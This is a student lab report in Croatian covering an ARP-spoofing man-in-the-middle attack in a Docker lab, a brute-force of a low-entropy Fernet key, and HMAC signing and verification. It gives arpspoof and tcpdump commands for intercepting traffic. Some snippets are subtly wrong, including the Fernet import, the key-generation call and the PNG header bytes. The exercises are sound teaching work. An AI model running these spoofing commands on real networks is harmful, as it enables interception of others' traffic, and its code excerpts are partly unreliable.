# Izvještaj laboratorijskih vježbi

# 1. Laboratorijska vježba

11.10.2021

## Zadatak

Realizirati man in the middle napad iskorištavanjem ranjivosti ARP protokola. Student će testirati napad u virtualiziranoj Docker mreži (Docker container networking) koju čine 3 virtualizirana Docker računala (eng. container): dvije žrtve **station-1** i **station-2** te napadač **evil-station**.

### Kloniranje GitHub repozitorija

```bash
git clone https://github.com/mcagalj/SRP-2021-22
```

### Ulazak u direktorij

```bash
cd SRP-2021-22/arp-spoofing/
```

### Running bash scripts

```bash
./start.sh
./stop.sh
```

### Pokrećanje iteraktivnog shella u station-1 kontenjeru

```python
docker exec -it station-1 bash
```

### Provjera nalazi li se station-2 na istoj mreži

```python
ping station-2
```

### Pokrećanje iteraktivnog shella u station-2 kontenjeru

```python
docker exec -it station-2 bash
```

### Pomoću netcat-a otvaramo server na portu 9000 na kontenjeru station-1

```python
netcat -lp 9000
```

### Pomoću netcat-a otvaramo client na hostname-u station-1 9000 na kontenjeru station-2

```python
netcat station-1 9000
```

### Pokrećanje iteraktivnog shella u evil-station kontenjeru

```python
docker exec -it evil-station bash
```

### Pokrećemo arpspoof u kontenjeru evil-station

```python
arpspoof -t station-1 station-2
```

### U kontenjeru evil-station pokrećemo tcpdump i pratimo promet

```python
tcpdump
```

```python
tcpdump -X host station-1 and not arp
```

### Prekidamo napad

```python
echo 0 > /proc/sys/net/ipv4/ip_forward
```

![Untitled](Izvjes%CC%8Ctaj%20laboratorijskih%20vjez%CC%8Cbi%207f8db425248d48e9bf2d2fa1cffd0156/Untitled.png)

# 2. Laboratorijska vježba

25.10.2021

U sklopu vježbe student će riješiti odgovarajući *crypto* izazov, odnosno dešifrirati odgovarajući *ciphertext* u kontekstu simetrične kriptografije. Izazov počiva na činjenici da student nema pristup enkripcijskom ključu.

Za pripremu *crypto* izazova, odnosno enkripciju korištena je Python biblioteka `[cryptography](https://cryptography.io/en/latest/)`. *Plaintext* koji student treba otkriti enkriptiran je korištenjem *high-level* sustava za simetričnu enkripciju iz navedene biblioteke - [Fernet](https://cryptography.io/en/latest/fernet/).

## Zadatak

Vaš izazov je rezultat enkripcije odgovarajućeg personaliziranog *plaintext*a korištenjem Fernet sustava.

### Kreiramo virutalno okruženje u pythonu

```python
C:\Users\A507\mcurlin> python -m venv mcurlin
```

### Ulazimo u direktorij i aktiviramo skriptu

```python
C:\Users\A507\mcurlin>cd mcurlin
```

```python
C:\Users\A507\mcurlin\mcurlin>cd Scripts
```

```python
C:\Users\A507\mcurlin\mcurlin\Scripts>activate
```

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin\Scripts>cd ..
```

### Instaliramo paket `[cryptography](https://cryptography.io/en/latest/)`

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>pip install cryptography
```

### Koristimo Fernet

```python
from cryptography.fernet import fernet

#generiramo enkripcijski ključ
key = Fernet.generate.key()

#kreiramo Fernet objekt
f = Fernet(key)

plaintext = b"hello world"

#enkriptiramo sadržaj varijable plaintext
ciphertext = f.encrypt(plaintext)

#dekriptiramo sadržaj varijable ciphertext
deciphertext = f.decrypt(ciphertext)
```

### Izazov je pohranjen u datoteku čiji naziv generiramo na sljedeći format

```python
from cryptography.hazmat.primitives import hashes

def hash(input):
    if not isinstance(input, bytes):
        input = input.encode()

    digest = hashes.Hash(hashes.SHA256()) #SHA256 - kriptografska funkcija
    digest.update(input)
    hash = digest.finalize()

    return hash.hex()

filename = hash('curlin_marko') + ".encrypted"

if __name__ == "__main__":
    h = hash('curlin_marko')
    print(h)
```

### Rezultat

```python
ff6d035811b701ee4a6ac775203480f31045c18e99a49a7ba38ca9f2ec34c3de
```

### Za enkripciju smo koristili **ključeve ograničene entropije - 22 bita**. Ključevi su generirani na sljedeći način

```python

# Encryption keys are 256 bits long and have the following format:
 #           
 #              0...000b[1]b[2]...b[22] 
 #
 # where b[i] is a randomly generated bit.
 key = int.from_bytes(os.urandom(32), "big") & int('1'*KEY_ENTROPY, 2)
 
 # Initialize Fernet with the given encryption key;
 # Fernet expects base64 urlsafe encoded key.
 key_base64 = base64.urlsafe_b64encode(key.to_bytes(32, "big"))
 fernet = Fernet(key_base64)
```

### Koristeći brute force pristup tražimo enkripcijski ključ

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>code brute_force.py
```

```python
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

def test_png(header):
    if header.startswith(b'\211PNG\032\n'): #header svakog png
        return True

def hash(input):
    if not isinstance(input, bytes):
        input = input.encode()

    digest = hashes.Hash(hashes.SHA256())
    digest.update(input)
    hash = digest.finalize()

    return hash.hex()

def brute_force():
    # Reading from a file
    filename = "ff6d035811b701ee4a6ac775203480f31045c18e99a49a7ba38ca9f2ec34c3de (1).encrypted"
    with open(filename, "rb") as file:
        ciphertext = file.read()
    # Now do something with the ciphertext
    ctr = 0

    while True:
        key_bytes = ctr.to_bytes(32, "big")
        key = base64.urlsafe_b64encode(key_bytes)
        if not (ctr + 1) % 1000: 
            print(f"[*] Key tested: {ctr + 1:,}", end="\r")

        # Now initialize the Fernet system with the given key
        # and try to decrypt your challenge.
        # Think, how do you know that the key tested is the correct key
        # (i.e., how do you break out of this infinite loop)?
        try:
            plaintext = Fernet(key).decrypt(ciphertext)
            header = plaintext[:32]

            if test_png(header):
                print(f"[+] KEY FOUND: {key}")
                
                # Writing to a file
                with open("BINGO.png", "wb") as file:
                    file.write(plaintext)
                break
            
            
        except Exception:
            pass
            
        ctr += 1

if __name__ == "__main__":
    brute_force()
```

# 3**. Laboratorijska vježba**

8.11.2021

Cilj vježbe je primjeniti teoreteske spoznaje o osnovnim kritografskim mehanizmima za autentikaciju i zaštitu integriteta poruka u praktičnom primjerima. Pri tome ćemo koristiti simetrične i asimetrične krito mehanizme: *message authentication code (MAC)* i *digitalne potpise* zasnovane na javnim ključevima.

### Kreiramo virutalno okruženje u pythonu

```python
C:\Users\A507\mcurlin> python -m venv mcurlin
```

### Ulazimo u direktorij i aktiviramo skriptu

```python
C:\Users\A507\mcurlin>cd mcurlin
```

```python
C:\Users\A507\mcurlin\mcurlin>cd Scripts
```

```python
C:\Users\A507\mcurlin\mcurlin\Scripts>activate
```

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin\Scripts>cd ..
```

### Instaliramo paket `[cryptography](https://cryptography.io/en/latest/)`

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>pip install cryptography
```

## Izazov 1

Implementirajte zaštitu integriteta sadržaja dane poruke primjenom odgovarajućeg *message authentication code (MAC)* algoritma. Koristite pri tome HMAC mehanizam iz Python biblioteka `[cryptography](https://cryptography.io/en/latest/hazmat/primitives/mac/hmac/)`.

### U lokalnom direktoriju kreirali smo tekstualnu datoteku odgovarajućeg sadržaja čiji integritet želimo zaštititi.

### Učitavanje sadržaja datoteke u memoriju.

```python
 # Reading from a file
 with open(filename, "rb") as file:
     content = file.read()
```

### Funkcija za izračun MAC vrijednosti za danu poruku.

```python
from cryptography.hazmat.primitives import hashes, hmac

def generate_MAC(key, message):
if not isinstance(message, bytes):
message = message.encode()

h = hmac.HMAC(key, hashes.SHA256())
h.update(message)
signature = h.finalize()
return signature
```

### Kreiramo file sa porukom koju treba zaštititi, pročitamo poruku iz file-a i ispisujemo je na standardni izlaz.

```python
with open("message.txt", "rb") as file:
        content = file.read()

print(content)
```

### Rezultat

```python
19f85271dc375ff9229a8680cc4cfd6839e44e50bdc29c02c19b83ff751d16a3
```

### Spremanje u file `message.sig`

```python
from cryptography.hazmat.primitives import hashes, hmac

def generate_MAC(key, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    signature = h.finalize()
    return signature

if __name__ == "__main__":
    key =b"my super secret"

     # Reading from a file
    with open("message.txt", "rb") as file:
        content = file.read()   

    mac = generate_MAC(key, content)

    with open("message.sig", "wb") as file:
        file.write(mac)
```

### Funkcija za provjeru validnosti MAC-a za danu poruku.

```python
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.exceptions import InvalidSignature

def verify_MAC(key, signature, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    try:
        h.verify(signature)
    except InvalidSignature:
        return False
    else:
        return True
```

```python
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.exceptions import InvalidSignature

def verify_MAC(key, signature, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    try:
        h.verify(signature)
    except InvalidSignature:
        return False
    else:
        return True

def generate_MAC(key, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    signature = h.finalize()
    return signature

if __name__ == "__main__":
    key =b"my super secret"

     # Reading from a file
    with open("message.txt", "rb") as file:
        content = file.read()   

     # Reading from a file
    with open("message.sig", "rb") as file:
        mac = file.read()

    is_authentic = verify_MAC(key, mac, content)
    print(is_authentic)
```

## **Izazov 2**

U ovom izazovu **želite utvrditi vremenski ispravnu skevencu transakcija (ispravan redosljed transakcija) sa odgovarajućim dionicama**. Digitalno potpisani (primjenom MAC-a) nalozi za pojedine transakcije nalaze se na lokalnom web poslužitelju.

Sa servera preuzmite personalizirane izazove (direktorij `prezime_ime/mac_challege`). Nalozi se nalaze u datotekama označenim kao `order_<n>.txt` a odgovarajući autentikacijski kod (*digitalni potpis*) u datotekama `order_<n>.sig`.

### Osobne izazove preuzimamo naredbom u terminalu:

```python
(mcurlin) C:\Users\A507\mcurlin\mcurlin>wget.exe -r -nH -np --reject "index.html*" [http://a507-server.local/challenges/curlin_marko](http://a507-server.local/challenges/curlin_marko)
```

```python
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.exceptions import InvalidSignature

def verify_MAC(key, signature, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    try:
        h.verify(signature)
    except InvalidSignature:
        return False
    else:
        return True

def generate_MAC(key, message):
    if not isinstance(message, bytes):
        message = message.encode()

    h = hmac.HMAC(key, hashes.SHA256())
    h.update(message)
    signature = h.finalize()
    return signature

if __name__ == "__main__":
    # Reading from a file
    #with open("message.txt", "rb") as file:
    #    content = file.read()   

    # Reading from a file
    #with open("message.sig", "rb") as file:
    #   mac = file.read()

    key = "curlin_marko".encode()
    
    for ctr in range(1, 11):
        msg_filename = f"order_{ctr}.txt"
        sig_filename = f"order_{ctr}.sig"    
        print(msg_filename)
        print(sig_filename)

        with open(msg_filename, "rb") as file:
            content = file.read()
        with open(sig_filename, "rb") as file:
            mac = file.read()

        #mac = generate_MAC(key, content)

        is_authentic = verify_MAC(key, mac, content)

        print(f'Message {content.decode():>45} {"OK" if is_authentic else "NOK":<6}')
```